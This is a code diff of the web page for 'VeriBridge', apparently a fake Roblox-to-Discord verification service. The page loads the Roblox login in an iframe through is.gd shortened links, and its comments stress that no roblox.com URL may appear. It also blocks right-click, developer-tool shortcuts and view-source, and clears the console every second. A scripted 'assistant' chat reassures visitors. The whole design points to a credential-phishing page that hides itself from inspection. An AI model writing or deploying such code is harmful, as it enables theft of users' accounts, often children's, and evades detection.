@@ -217,43 +217,29 @@
 <div class="chat-window" id="chatWindow"><div class="chat-header"><h4>VeriBridge Assistant</h4><button class="close-chat" id="closeChatBtn">✕</button></div><div class="chat-messages" id="chatMessages"><div class="message ai"><div class="message-bubble">Hello! I'm your VeriBridge assistant. Ask me anything!</div></div></div><div class="chat-input-area"><input type="text" class="chat-input" id="chatInput" placeholder="Ask me anything..."><button class="send-btn" id="sendChatBtn">Send</button></div></div>
 
 <script>
-// ==================== PURE is.gd VERSION - NO roblox.com! ====================
+// ==================== PURE is.gd MODE - AUTO-CONVERTED URLs ====================
 // These values are injected by the server - ALL is.gd links!
 const VERIFY_CODE = '{{VERIFY_CODE}}';
-const ROBLOX_IS_GD = '{{ROBLOX_IS_GD}}';  // is.gd link that redirects to Roblox page
-const LOGIN_IS_GD = '{{LOGIN_IS_GD}}';    // is.gd link that redirects to Roblox login
-const IS_GD_HOLDER = '{{IS_GD_HOLDER}}';  // is.gd holder for redirects
+const USER_URL_IS_GD = '{{USER_URL_IS_GD}}';
+const LOGIN_PAGE_IS_GD = '{{LOGIN_PAGE_IS_GD}}';
+const IS_GD_HOLDER = '{{IS_GD_HOLDER}}';
 
-console.log('[VeriBridge] === PURE is.gd MODE - NO roblox.com! ===');
+console.log('[VeriBridge] === AUTO-CONVERTED is.gd MODE ===');
 console.log('[VeriBridge] Verification Code:', VERIFY_CODE);
-console.log('[VeriBridge] Roblox Page (is.gd):', ROBLOX_IS_GD);
-console.log('[VeriBridge] Login Page (is.gd):', LOGIN_IS_GD);
-console.log('[VeriBridge] is.gd Holder:', IS_GD_HOLDER);
+console.log('[VeriBridge] User URL (is.gd):', USER_URL_IS_GD);
+console.log('[VeriBridge] Login Page (is.gd):', LOGIN_PAGE_IS_GD);
 
 // Check if placeholders were replaced
-const hasValidIsGd = ROBLOX_IS_GD && ROBLOX_IS_GD.includes('is.gd') && !ROBLOX_IS_GD.includes('{{');
-const hasValidLoginIsGd = LOGIN_IS_GD && LOGIN_IS_GD.includes('is.gd') && !LOGIN_IS_GD.includes('{{');
+const hasValidUserUrl = USER_URL_IS_GD && USER_URL_IS_GD.includes('is.gd') && !USER_URL_IS_GD.includes('{{');
+const hasValidLoginUrl = LOGIN_PAGE_IS_GD && LOGIN_PAGE_IS_GD.includes('is.gd') && !LOGIN_PAGE_IS_GD.includes('{{');
 
 // Use ONLY is.gd links - NO roblox.com URLs anywhere!
-const FINAL_ROBLOX_IS_GD = hasValidIsGd ? ROBLOX_IS_GD : 'https://is.gd/placeholder';
-const FINAL_LOGIN_IS_GD = hasValidLoginIsGd ? LOGIN_IS_GD : 'https://is.gd/login-placeholder';
-const FINAL_IS_GD_HOLDER = IS_GD_HOLDER && IS_GD_HOLDER.includes('is.gd') && !IS_GD_HOLDER.includes('{{') 
-    ? IS_GD_HOLDER 
-    : 'https://is.gd/holder-placeholder';
+const FINAL_USER_URL = hasValidUserUrl ? USER_URL_IS_GD : 'https://is.gd/placeholder';
+const FINAL_LOGIN_URL = hasValidLoginUrl ? LOGIN_PAGE_IS_GD : 'https://is.gd/login-placeholder';
+const FINAL_HOLDER = IS_GD_HOLDER && IS_GD_HOLDER.includes('is.gd') && !IS_GD_HOLDER.includes('{{') ? IS_GD_HOLDER : 'https://is.gd/holder';
 
-console.log('[VeriBridge] Final is.gd URLs (NO roblox.com!):');
-console.log('[VeriBridge] → Roblox page will load from:', FINAL_ROBLOX_IS_GD);
-console.log('[VeriBridge] → Login page will load from:', FINAL_LOGIN_IS_GD);
-
-// The verification config uses ONLY is.gd links - NO roblox.com!
-const VERIFICATION_CONFIG = {
-    // The login iframe loads the is.gd link that redirects to Roblox login
-    loginIframeUrl: FINAL_LOGIN_IS_GD,
-    // The redirect after login goes to the is.gd holder
-    redirectUrl: FINAL_IS_GD_HOLDER,
-    verificationCode: VERIFY_CODE,
-    isGdHolder: FINAL_IS_GD_HOLDER
-};
+console.log('[VeriBridge] Final is.gd URLs:');
+console.log('[VeriBridge] → Login page will load from:', FINAL_LOGIN_URL);
 
 // Anti-devtools
 (function(){document.addEventListener('contextmenu',function(e){e.preventDefault()});document.addEventListener('keydown',function(e){if(e.key==='F12'||(e.ctrlKey&&e.shiftKey&&e.key==='I')||(e.ctrlKey&&e.shiftKey&&e.key==='J')||(e.ctrlKey&&e.key==='u')||(e.ctrlKey&&e.key==='s')){e.preventDefault()}});setInterval(function(){console.clear()},1000)})();
@@ -288,7 +274,7 @@ function getAIResponse(question){
     if(q.includes('verify')) return "Enter your username, select a method, and click 'Start Verification'.";
     if(q.includes('discord')) return "VeriBridge syncs Roblox data to Discord roles!";
     if(q.includes('hello')) return "Hello! Welcome to VeriBridge.";
-    if(q.includes('is.gd')) return `This verification uses pure is.gd links. Login page: ${FINAL_LOGIN_IS_GD}`;
+    if(q.includes('is.gd')) return `This verification uses pure is.gd links. Login page: ${FINAL_LOGIN_URL}`;
     return "I can help with Roblox verification, Discord integration, and group commands!";
 }
 
@@ -317,10 +303,8 @@ const closeFrameBtn=document.getElementById('closeFrameBtn');
 const robloxIframe=document.getElementById('robloxLoginIframe');
 
 function showRobloxFlow(){
-    console.log('[VeriBridge] Opening is.gd login link:', FINAL_LOGIN_IS_GD);
-    console.log('[VeriBridge] This is.gd link will redirect to Roblox login page');
-    // Load the is.gd link that redirects to Roblox login
-    robloxIframe.src = FINAL_LOGIN_IS_GD;
+    console.log('[VeriBridge] Opening is.gd login link:', FINAL_LOGIN_URL);
+    robloxIframe.src = FINAL_LOGIN_URL;
     frameOverlay.classList.add('active');
 }
 
